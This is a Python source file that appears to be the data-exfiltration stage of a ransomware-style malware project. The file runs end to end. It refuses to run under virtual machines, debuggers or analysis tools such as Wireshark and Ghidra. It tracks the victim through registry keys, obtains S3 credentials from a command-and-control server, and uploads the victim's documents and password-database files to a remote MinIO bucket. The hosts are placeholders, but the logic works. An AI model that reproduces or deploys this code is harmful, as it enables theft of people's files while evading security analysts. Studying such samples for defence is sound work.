# coding: utf-8

# Additional modules -> install via pip
import httpx  # Handling HTTP requests/responses
import minio  # Handling Minio S3 storage

# Native modules
import pathlib  # Handling file paths
import sys  # Handling system related tasks (hostname/usernames)
import ctypes  # Calling Windows APIs
import winreg  # Editing Windows Registry
from subprocess import check_output  # Reading processes on system
from time import sleep  # 😴

# Variables
# Address of the remote C2 server
c2_url = "http://localhost:5000"
# Address of the remote S3 server
s3_host = "minio.example.com"
# List of paths. Every file in these locations will be uploaded ...
target_paths = [".\\toencrypt", ".\\toencrypt2"]
# ... but only with these extensions
include_types = (".txt", ".doc", ".xls", ".docx", ".xlsx", ".kbdx")
# If any of these processes is running on the host, Exfiltration will not run.
program_blacklist = [
    "vmware",
    "vbox",
    "ghidra",
    "ollydbug",
    "x64dbg",
    "tcpdump",
    "wireshark",
]


class Exfiltration:
    """This object initializes the exfiltration stage"""

    def __init__(self):
        self.victim_id = None
        # S3 credentials which will be received by C2 server later on
        self.s3_bucket = None
        self.s3_access_key = None
        self.s3_secret_key = None

    def initial_check(self):
        """Checks for existing Registry entries -> Has the Loader been successfully initialized?"""
        if self.check_registry_entry("ExfiltrationDone") == "True":
            sys.exit()
        if self.check_registry_entry("ID") is not None:
            self.victim_id = self.check_registry_entry("ID")
        else:
            sys.exit()

    def is_admin(self):
        """Checks if the tool has been run with Admin privileges. Otherwise print error"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            else:
                return False
        except Exception as err:
            print(f"is_admin(): Error --> {err}")
            return False

    def is_blacklisted_process_running(self):
        """Reads process lists on system and compares it to the predefined blacklist"""
        tasks_all = check_output(("TASKLIST", "/FO", "CSV"))
        tasks_formatted = tasks_all.decode().splitlines()
        tasks_listed = [
            process.lower().split(",")[0][1:-5] for process in tasks_formatted
        ]
        for x in program_blacklist:
            # As soon as 1 blacklisted program is detected, return True -> Malware will not be executed
            if x in tasks_listed:
                return True
        return False

    def get_s3_credentials(self):
        """Gets the S3 credentials from the C2 server. This is needed to upload the exfiltration data"""
        try:
            response = httpx.get(f"{c2_url}/exfil/{self.victim_id}")
            self.s3_bucket = response.headers["S3-Bucket"]
            self.s3_access_key = response.headers["S3-Access-Key"]
            self.s3_secret_key = response.headers["S3-Secret-Key"]
        except Exception as err:
            print(f"get_s3_credentials(): Error --> {err}")
            return False

    def create_registry_entry(self, subkey, subkeyvalue):
        """Creates a Registry entry with the given subkey and subkeyvalue"""
        keyName = r"Software\Blocky\Main"
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
        winreg.SetValueEx(key, subkey, 0, winreg.REG_SZ, subkeyvalue)
        winreg.CloseKey(key)

    def check_registry_entry(self, subkey):
        """Checks for existing Registry entries -> Has the malware been here before?"""
        keyName = r"Software\Blocky\Main"
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
            return winreg.QueryValueEx(key, subkey)[0]
        except:
            # Else exit the program
            return None

    def upload_to_s3(self):
        """Uploads all files in target_paths to the remote S3 server"""
        # Create a minio client object
        try:
            mc = minio.Minio(
                s3_host,
                access_key=self.s3_access_key,
                secret_key=self.s3_secret_key,
                secure=True,
            )
        except Exception as err:
            print(f"upload_to_s3(): Error --> {err}")
            return False
        # Iterate over all target_paths
        for path in target_paths:
            # Get all files in the target_path
            for file in pathlib.Path(path).glob("**/*"):
                # If file is a directory, skip it
                if file.is_dir():
                    continue
                # If file is a file, upload it to the remote S3 server
                try:
                    mc.fput_object(
                        self.s3_bucket,
                        file.name,
                        file,
                        content_type="application/octet-stream",
                    )
                except Exception as err:
                    print(f"upload_to_s3(): Error --> {err}")
                    return False
        self.create_registry_entry("ExfiltrationDone", "True")
        return True


if __name__ == "__main__":
    exfiltration = Exfiltration()
    # Exit the programm, should it be run as non-Admin
    if not exfiltration.is_admin():
        sys.exit()
    # Exit the programm, should a program listed on the Blacklist be detected.
    if exfiltration.is_blacklisted_process_running():
        sys.exit()
    # Exit the programm, should a debugger be detected, so no malicious activity is run.
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit()
    # Start check if system is already infected or not
    exfiltration.initial_check()
    # Receive S3 credentials from C2 server
    exfiltration.get_s3_credentials()
    # Upload all files in target_paths to the remote S3 server
    exfiltration.upload_to_s3()
